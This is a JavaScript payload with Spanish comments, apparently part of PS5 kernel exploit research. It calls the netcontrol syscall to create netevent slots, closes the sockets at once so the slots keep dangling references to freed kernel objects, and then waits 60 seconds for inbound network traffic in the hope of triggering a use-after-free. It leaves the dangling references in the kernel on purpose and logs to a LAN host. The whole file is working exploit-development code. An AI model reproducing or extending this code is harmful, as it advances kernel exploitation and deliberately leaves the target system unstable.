// 2026-08-28 netctl4_inbound_1320: netevents COLGANTES deliberados + VENTANA de trafico ENTRANTE del PC. Base: netctl2_1320.js (canal W, helpers mk/nc, sockaddr).
// TESIS (RESEARCH/netcontrol-netevent-2026-08.md S4): SET(ifx)->ok guarda ref al socket; close(s) INMEDIATO deja la ranura LLENA apuntando a un file object LIBERADO. CLEAR parcheado (errno5) NO la limpia -> colgante PERSISTENTE (vive en ifnet del kernel, sobrevive relaunch). Pregunta: que evento hace que la kernel TOQUE ne->socket? Candidato = trafico ENTRANTE (if_input). Si el colgante ifx0 (liberado hace horas) se toca -> UAF larga persistencia.
// NOTA: el payload NO puede generarse trafico entrante desde la LAN. FASE 2 = VENTANA 60s para que MI PC (script aparte, paralelo) dispare entrante a 192.168.1.42: UDP 1-65535 + TCP a puertos abiertos. CRASHEA en ventana -> UAF por input CONFIRMADO; sobrevive -> input no es el trigger.
// netcontrol=syscall(0x63n, ifx, cmd, buf8(fd), 8n); SET=0x20000003. Sin mmap/thr_new/rfork/read64. Bucles acotados. Colgantes QUEDAN en kernel a proposito (limpieza = reboot). <5KB.
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const NCX=0x63n,SETQ=0x20000003n,YIELD=331n,PS5="192.168.1.42";
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
W("[netctl4] inicio - canal "+(sock>=0n?"OK":"MUERTO")+" - colgantes + ventana entrante");
const B8=malloc(8);
const mk=(t,i)=>{const fd=I(syscall(SYSCALL.socket,2n,1n,0n));W(t+": socket s"+i+" fd="+fd);return fd};
const nc=(v,fd,ifx,cmd,d)=>{const p=v+": "+d+" (fd="+fd+") ifx=0x"+Number(ifx).toString(16);W(p+"...");write64(B8,fd);const r=I(syscall(NCX,B(ifx),cmd,B8,8n));const e=r<0?EN():0;W(p+" -> ret="+r+(r<0?" errno="+e:""));return{r,e}};
// ===== FASE 1: crear netevents COLGANTES (SET->ok->close inmediato) =====
const COL=[];
try{
 W("== FASE 1: netevents COLGANTES (SET->close inmediato) ifx[1,2,3] ==");
 N("[netctl4] FASE1 creando colgantes ifx1/2/3 (cada ranura llena->socket liberado)");
 for(const x of [1,2,3]){const fd=mk("COL",x);
  if(fd<0n){W("COL: ifx="+x+" socket FALLO");continue;}
  const q=nc("COL",fd,x,SETQ,"SET ifx="+x+" (ref viva)");
  if(q.r>=0n){syscall(SYSCALL.close,fd);W("COL: ifx="+x+" SET ok + close(s"+fd+") -> COLGANTE (ranura llena->socket LIBERADO)");COL.push(x);N("[netctl4] HITO: colgante ifx="+x+" instalado (fd="+fd+" cerrado)");}
  else{W("COL: ifx="+x+" SET errno="+q.e+" -> NO colgante (sucio/lleno previo, fd cerrado)");syscall(SYSCALL.close,fd);}}
 W("FASE1: COLGANTES instalados ifx=["+COL.join(",")+"]"+(COL.length?"":" (NINGUNO)"));
}catch(e){W("FASE1 EX: "+e)}
// ===== FASE 2: VENTANA 60s para el trafico ENTRANTE del PC =====
try{
 const msg="[netctl4] COLGANTES CREADOS ifx=["+(COL.join(",")||"-")+"]: el PC debe enviar TRAFICO ENTRANTE a "+PS5+" (UDP 1-65535 + TCP a puertos abiertos) - 60s de ventana";
 W("== FASE 2: VENTANA ENTRANTE 60s (abierta a trafico del PC hacia la PS5) ==");
 W(msg);N(msg);
 // 15000 sched_yield x4 ~ 60s de ventana para el PC/operador
 for(let w=1;w<=4;w++){for(let j=0;j<15000;j++)syscall(YIELD);
  W("[netctl4] ventana "+(w*15)+"/60s VIVA (colgantes ifx=["+COL.join(",")+"])");
  N("[netctl4] ventana "+(w*15)+"/60s VIVA");}
 W("[netctl4] SOBREVIVIO a la ventana de trafico entrante (60s)");
}catch(e){W("FASE2 EX (posible crash/inestabilidad): "+e)}
// ===== FASE 3: post-ventana - re-mapa por ifx (SET = ranura libre? o sigue sucia) =====
try{
 W("== FASE 3: post-ventana - re-mapa ifx ==");
 const codes=[];
 for(const x of [0,1,2,3]){const fd=mk("MAP",x);
  if(fd<0n){codes.push("sockfail");continue;}
  const q=nc("MAP",fd,x,SETQ,"re-SET ifx="+x);
  codes.push(q.r>=0n?"OK":"e"+q.e);
  W("MAP: ifx="+x+" -> "+(q.r>=0n?"OK ranura LIBRE (colgante se limpio?)":"errno "+q.e+" sigue LLENA/sucia"));
  syscall(SYSCALL.close,fd);}
 W("MAPA post=["+codes.join(" ")+"] (colgantes instalados fueron ifx=["+COL.join(",")+"])");
 W("[netctl4] VEREDICTO: sobrevivo ventana entrante; colgantes=["+(COL.join(",")||"-")+"]; post=["+codes.join(",")+"]"+(COL.length?" -> ranuras colgantes PERSISTEN":""));
}catch(e){W("FASE3 EX: "+e)}
// ===== final: colgantes QUEDAN en kernel a proposito; cerrar solo canal W =====
W("[netctl4] cleanup: colgantes DEJADOS en kernel (limpieza = reboot). Cierro SOLO canal W.");
W("PAYLOAD DONE");
N("[netctl4] PAYLOAD DONE - colgantes vivos en kernel");
for(let i=0;i<30;i++){N("[netctl4] vivo "+(30-i));for(let j=0;j<3000;j++)syscall(YIELD)}
try{if(sock>=0n)syscall(SYSCALL.close,sock)}catch(e){}
})();
